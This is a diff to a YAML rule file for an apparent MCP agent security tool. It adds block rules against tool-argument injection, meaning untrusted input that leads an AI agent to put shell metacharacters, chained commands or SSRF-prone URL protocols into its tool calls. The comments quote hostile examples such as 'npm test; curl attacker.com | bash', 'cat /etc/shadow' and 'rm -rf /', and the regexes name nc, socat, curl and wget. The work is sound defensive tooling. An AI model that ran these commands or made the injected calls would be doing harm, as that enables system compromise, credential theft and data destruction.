@@ -1,6 +1,6 @@
 name: "MCP AI Content Integrity"
-description: "Audit AI-generated writes to security-sensitive and compliance-critical documentation paths to prevent hallucination injection and misinformation propagation"
-version: "1.0.0"
+description: "Audit AI-generated writes to security-sensitive and compliance-critical documentation paths to prevent hallucination injection and misinformation propagation. Also blocks tool argument injection attacks."
+version: "1.1.0"
 author: "AgentShield Security Research"
 
 # AI agents writing unverified content to compliance-critical files creates persistent
@@ -10,6 +10,7 @@ author: "AgentShield Security Research"
 # See taxonomy entries:
 #   unauthorized-execution/ai-content-integrity/ai-hallucination-injection
 #   unauthorized-execution/ai-content-integrity/ai-misinformation-propagation
+#   unauthorized-execution/agentic-attacks/tool-argument-injection
 
 rules:
   # === AUDIT: Write to SECURITY.md or similar root-level security docs ===
@@ -102,3 +103,66 @@ structural_rules:
     decision: "AUDIT"
     reason: "AI-generated write to compliance-sensitive documentation — human review required before publishing (LLM09: hallucination injection / misinformation propagation)"
     confidence: 0.85
+
+  # ============================================================
+  # Tool Argument Injection (issue #184)
+  # Taxonomy: unauthorized-execution/agentic-attacks/tool-argument-injection
+  #
+  # When an AI agent constructs MCP tool call arguments from LLM output that
+  # processed untrusted input, attackers can inject shell metacharacters into
+  # path/command args or dangerous protocol handlers into URL args.
+  # OWASP LLM02 (Insecure Output Handling), LLM07. MITRE T1059/T1190.
+  # ============================================================
+
+  # BLOCK: Shell metacharacters in path argument
+  # A path like "/workspace/project; cat /etc/shadow" or "/tmp/`id`/file"
+  # escapes the file path context into shell execution when passed to system calls.
+  - id: mcp-struct-block-shell-meta-in-path
+    taxonomy: "unauthorized-execution/agentic-attacks/tool-argument-injection"
+    match:
+      tool_name_regex: ".*"
+      args_match:
+        path:
+          pattern_any:
+            - "[;&|`]"
+            - "\\$\\("
+            - "\\$\\{"
+    decision: "BLOCK"
+    reason: "Shell metacharacters detected in MCP path argument — injection attempt to escape file path context into shell execution (OWASP LLM02: Insecure Output Handling)"
+    confidence: 0.88
+
+  # BLOCK: Shell injection chains in command argument
+  # Detects chained dangerous commands injected into a command argument,
+  # e.g. "npm test; curl attacker.com | bash" or "ls && rm -rf /".
+  - id: mcp-struct-block-shell-inject-in-command
+    taxonomy: "unauthorized-execution/agentic-attacks/tool-argument-injection"
+    match:
+      tool_name_regex: ".*"
+      args_match:
+        command:
+          pattern_any:
+            - ";\\s*(rm|curl|wget|bash|sh|python3?|nc|ncat|socat)\\b"
+            - "\\|\\s*(bash|sh|python3?|nc|ncat|socat)\\b"
+            - "&&\\s*(rm|curl|wget|bash|sh|python3?)\\b"
+            - "`[^`]{1,100}`"
+            - "\\$\\([^)]{1,100}\\)"
+    decision: "BLOCK"
+    reason: "Shell injection chain detected in MCP command argument — injected sub-command or dangerous command sequence (OWASP LLM02)"
+    confidence: 0.87
+
+  # BLOCK: Dangerous protocol handlers in URL argument (protocol injection / SSRF)
+  # file:// accesses local files; gopher:// and dict:// are classic SSRF pivots.
+  - id: mcp-struct-block-dangerous-protocol-in-url
+    taxonomy: "unauthorized-execution/agentic-attacks/tool-argument-injection"
+    match:
+      tool_name_regex: ".*"
+      args_match:
+        url:
+          pattern_any:
+            - "(?i)^file://"
+            - "(?i)^gopher://"
+            - "(?i)^dict://"
+            - "(?i)^ftp://(?:localhost|127\\.0\\.0\\.1|0\\.0\\.0\\.0|\\[::1\\])"
+    decision: "BLOCK"
+    reason: "Dangerous protocol handler in MCP URL argument — file:// enables local file access; gopher:// and dict:// are classic SSRF pivots (OWASP LLM02)"
+    confidence: 0.90
